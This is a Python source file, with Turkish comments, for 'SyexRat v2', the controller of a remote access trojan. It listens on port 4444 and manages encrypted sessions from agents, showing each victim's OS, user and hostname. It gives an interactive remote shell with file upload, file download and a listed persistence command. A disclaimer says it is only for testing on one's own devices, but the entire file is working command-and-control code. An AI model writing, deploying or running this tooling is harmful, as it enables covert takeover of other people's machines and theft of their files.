#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SyexRat v2 - Controller (syexrat_Control.py)
Kendi cihazlariniz arasindaki test icin.
Kurulum: pip install cryptography
"""

import socket
import threading
import base64
import json
import os
import sys
import struct
import hashlib

from cryptography.fernet import Fernet

HOST = "0.0.0.0"
PORT = 4444
SECRET = "SyexSecretKey2026"   # Agent ile AYNI olmali

fernet = Fernet(base64.urlsafe_b64encode(
    hashlib.sha256(SECRET.encode()).digest()))

sessions = {}
session_counter = 0
lock = threading.Lock()


def encode_packet(data: bytes) -> bytes:
    ct = fernet.encrypt(data)
    return struct.pack(">I", len(ct)) + ct


def recv_exact(sock, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(min(n - len(buf), 65536))
        if not chunk:
            raise ConnectionError("baglanti kesildi")
        buf += chunk
    return buf


def decode_packet(sock) -> bytes:
    length = struct.unpack(">I", recv_exact(sock, 4))[0]
    return fernet.decrypt(recv_exact(sock, length))


def handle_client(conn: socket.socket, addr):
    global session_counter
    try:
        sysinfo = json.loads(decode_packet(conn).decode())
    except Exception:
        conn.close()
        return

    with lock:
        session_counter += 1
        sid = session_counter
        sessions[sid] = (conn, addr, sysinfo)

    print(f"\n[+] Yeni baglanti #{sid}: {addr[0]} | {sysinfo['os']} | "
          f"user={sysinfo['user']} | host={sysinfo['hostname']}")
    print("syex> ", end="", flush=True)


def list_sessions():
    with lock:
        if not sessions:
            print("[*] Aktif oturum yok.")
            return
        print(f"\n  {'ID':<4} {'IP':<18} {'OS':<12} {'Kullanici':<15} {'Host':<15}")
        print("  " + "-" * 60)
        for sid, (_, addr, info) in sessions.items():
            print(f"  {sid:<4} {addr[0]:<18} {info['os']:<12} "
                  f"{info['user']:<15} {info['hostname']:<15}")
    print()


def interactive(sid: int):
    with lock:
        if sid not in sessions:
            print("[-] Boyle bir oturum yok.")
            return
        conn, addr, sysinfo = sessions[sid]

    print(f"\n[*] Oturum #{sid} ({addr[0]}) - 'back' ile donun")
    print("[*] Ozel: sysinfo | ping | persist | download <dosya> | "
          "upload <dosya> | cd <dizin> | exit\n")

    while True:
        try:
            cmd = input(f"#{sid} {sysinfo['user']}@{sysinfo['hostname']}$ ").strip()
        except (EOFError, KeyboardInterrupt):
            cmd = "back"

        if not cmd:
            continue
        if cmd == "back":
            return

        try:
            # --- UPLOAD: kontrol -> ajan dosya gonder ---
            if cmd.startswith("upload "):
                filepath = cmd[7:].strip()
                if not os.path.isfile(filepath):
                    print(f"[-] Dosya yok: {filepath}")
                    conn.sendall(encode_packet(cmd.encode()))
                    conn.sendall(encode_packet(b"__CANCEL__"))
                    continue
                size = os.path.getsize(filepath)
                meta = json.dumps(
                    {"file": os.path.basename(filepath), "size": size}).encode()
                conn.sendall(encode_packet(cmd.encode()))
                conn.sendall(encode_packet(b"__FILE__" + meta))
                sent = 0
                with open(filepath, "rb") as f:
                    while sent < size:
                        chunk = f.read(65536)
                        if not chunk:
                            break
                        conn.sendall(encode_packet(chunk))
                        sent += len(chunk)
                print(f"[+] Gonderildi: {filepath} ({sent}B)")
                try:
                    print("    " + decode_packet(conn).decode(errors="replace"))
                except ConnectionError:
                    pass
                continue

            # --- Normal komut gonder ---
            conn.sendall(encode_packet(cmd.encode()))

            # --- DOWNLOAD: ajan dosya yollar ---
            if cmd.startswith("download "):
                raw = decode_packet(conn)
                if raw.startswith(b"__FILE__"):
                    meta = json.loads(raw[8:].decode())
                    received = 0
                    try:
                        with open(meta["file"], "wb") as f:
                            while received < meta["size"]:
                                chunk = decode_packet(conn)
                                f.write(chunk)
                                received += len(chunk)
                        print(f"[+] Indirildi: {meta['file']} ({received}B)")
                    except Exception as e:
                        print(f"[-] Indirme hatasi: {e}")
                    # ajanin durum raporu
                    try:
                        print("    " + decode_packet(conn).decode(errors="replace"))
                    except ConnectionError:
                        pass
                elif raw == b"__CANCEL__":
                    print("[-] Dosya bulunamadi.")
                else:
                    print(raw.decode(errors="replace"))
                continue

            # --- Normal cikti ---
            out = decode_packet(conn).decode("utf-8", errors="replace")
            print(out)

        except (ConnectionError, OSError):
            print("[-] Baglanti koptu.")
            with lock:
                sessions.pop(sid, None)
            return


def close_all():
    with lock:
        for sid, (conn, _, _) in list(sessions.items()):
            try:
                conn.sendall(encode_packet(b"exit"))
                conn.close()
            except Exception:
                pass
        sessions.clear()


def command_loop():
    while True:
        try:
            cmd = input("syex> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Cikiliyor...")
            close_all()
            sys.exit(0)

        if cmd == "sessions":
            list_sessions()
        elif cmd.startswith("use "):
            try:
                interactive(int(cmd[4:].strip()))
            except ValueError:
                print("[-] Kullanim: use <oturum_id>")
        elif cmd in ("help", "?"):
            print("  sessions   - oturumlari listele")
            print("  use <id>   - oturuma baglan")
            print("  exit       - tum oturumlari kapat ve cik")
        elif cmd == "exit":
            close_all()
            print("[+] Kapatildi. Guvenli gunler!")
            sys.exit(0)
        elif cmd == "":
            continue
        else:
            print("[?] 'help' yazin.")


def main():
    print("=" * 55)
    print("  SyexRat v2 Controller - Sadece kendi cihazlariniz icin")
    print("=" * 55)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((HOST, PORT))
        server.listen(10)
    except OSError as e:
        print(f"[-] Port acilamadi ({PORT}): {e}")
        sys.exit(1)

    print(f"[*] Dinleniyor: 0.0.0.0:{PORT}")
    print("[*] Komutlar: sessions | use <id> | help | exit\n")

    threading.Thread(target=command_loop, daemon=True).start()

    while True:
        try:
            conn, addr = server.accept()
            threading.Thread(target=handle_client,
                             args=(conn, addr), daemon=True).start()
        except KeyboardInterrupt:
            print("\n[*] Kapatiliyor...")
            close_all()
            sys.exit(0)


if __name__ == "__main__":
    main()
